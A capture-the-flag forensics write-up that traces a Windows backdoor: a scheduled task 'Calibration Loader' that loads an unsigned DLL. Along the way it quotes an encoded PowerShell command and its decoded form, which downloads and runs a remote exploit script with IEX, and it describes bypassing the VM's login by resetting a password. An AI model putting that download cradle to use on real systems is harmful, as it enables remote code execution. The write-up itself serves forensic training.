This challenge was divided in 2 parts

## 1

We need to find the hash of a malicious binary present on the VM. First, we need to unlock the VM because we don't have the password!

To do this, I use the tool `Passcap rest.iso` which I load into a virtual disk and boot from in order to find an admin account where I can change the password. I find the account john and assign it the password `forensic`

The first log analyses via `eventvwr` prove to be conclusive in the tab: Application and service log => Powershell:

```
powershell.exe -nop -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxAC8AZQB4AHAAbABvAGkAdAAuAHAAcwAxACcAKQA=
```

Strange... if we decode it:

```
IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1/exploit.ps1')
```

So an exploit is downloaded via PowerShell. We therefore need to find the binary that performs the download via PowerShell (potentially an unsigned binary / suspicious name, etc...)

To do this, I will use Process Monitor with bootlog enabled (since it's launched at startup) where I configure an advanced filter:

Operation => Process Create
Path => contains "powershell.exe"

Then we restart. We accept to open the bootlog when I relaunch Process Monitor and observe that the parent of powershell.exe is taskhostw\.exe (so a scheduled task), and if we look at the DLL imports:

![alt text](note/ctf/Midnight_2025/asset/blackdoor1.png)

We find a DLL not signed by Windows: mscms2.dll

We check its hash with VirusTotal: 04c740418760eb3cdd738a4480337e03

First part done!

## 2

We saw that it was a scheduled task and we need its ID:

First, I launch Autorun and go to the Scheduled Task section:

![alt text](note/ctf/Midnight_2025/asset/blackdoor2.png)

I find the task `Calibration Loader` which is suspicious and linked to the DLL, I retrieve all the info in XML format via a PowerShell command:

```powershell
Get-ScheduledTask -TaskPath "\Microsoft\Windows\WindowsColorSystem" -TaskName "Calibration Loader" | Export-ScheduledTask
```

And find its ID: `<ClassId>{B210D694-C8DF-490D-9576-9E20CDBC20BD}`

Which corresponds to the end of the challenge.
